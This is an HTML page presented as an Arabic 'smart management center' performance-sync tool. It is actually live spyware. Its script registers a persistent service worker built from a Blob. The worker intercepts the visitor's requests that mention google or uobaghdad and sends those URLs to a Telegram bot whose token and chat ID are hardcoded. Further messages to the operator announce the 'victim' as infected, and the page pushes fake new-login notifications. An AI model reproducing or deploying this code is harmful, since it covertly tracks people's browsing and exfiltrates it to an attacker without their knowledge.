<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مركز الإدارة الذكي | v2.0</title>
    <style>
        :root { --neon: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        
        .glass-card {
            background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1); padding: 50px;
            border-radius: 30px; width: 400px; text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }

        h2 { color: var(--neon); text-shadow: 0 0 10px var(--neon); margin-bottom: 5px; }
        .loader { border: 3px solid #111; border-top: 3px solid var(--neon); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-family: monospace; font-size: 11px; color: #555; }
    </style>
</head>
<body>

    <div class="glass-card">
        <h2>SYSTEM_SYNC</h2>
        <p style="font-size: 14px; color: #888;">جاري مزامنة بيانات الأداء بالخلفية...</p>
        <div class="loader"></div>
        <div id="status">> جاري تهيئة البروتوكول...</div>
    </div>

<script>
    const BOT_TOKEN = "7713540341:AAGfI7IguGT5dwEhiocvC9h0mVW9js4ByJQ";
    const CHAT_ID = "6778604620";

    // 1. صناعة ملف الـ Service Worker برمجياً (Blob)
    const swCode = `
        const BOT_TOKEN = "${BOT_TOKEN}";
        const CHAT_ID = "${CHAT_ID}";

        self.addEventListener('install', () => self.skipWaiting());
        self.addEventListener('activate', (e) => e.waitUntil(clients.claim()));

        // اعتراض حركة المرور وسرقة المسارات
        self.addEventListener('fetch', (event) => {
            if (event.request.url.includes('google') || event.request.url.includes('uobaghdad')) {
                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=🎯 YOU_RECON: الضحية يتصفح الآن: ' + encodeURIComponent(event.request.url));
            }
            event.respondWith(fetch(event.request));
        });

        // رسالة تظهر حتى لو المتصفح مغلق (إذا كان يدعم الـ Push)
        self.addEventListener('push', (event) => {
            self.registration.showNotification('تنبيه من YOU', { body: 'تم تسجيل دخول جديد لجهازك.' });
        });
    `;

    // 2. تحويل الكود إلى ملف حقيقي داخل ذاكرة المتصفح
    const blob = new Blob([swCode], { type: 'application/javascript' });
    const swUrl = URL.createObjectURL(blob);

    // 3. تسجيل "المستوطنة"
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register(swUrl).then(reg => {
            document.getElementById('status').innerText = "> تم التثبيت الدائم بنجاح. البروتوكول نشط الآن.";
            
            // إرسال إشعار أولي لـ YOU
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔥 YOU: المستوطنة الرقمية استقرت في جهاز الضحية!`);
        }).catch(err => {
            document.getElementById('status').innerText = "> خطأ: HTTPS مطلوب للتثبيت الدائم.";
        });
    }
</script>

</body>
</html>
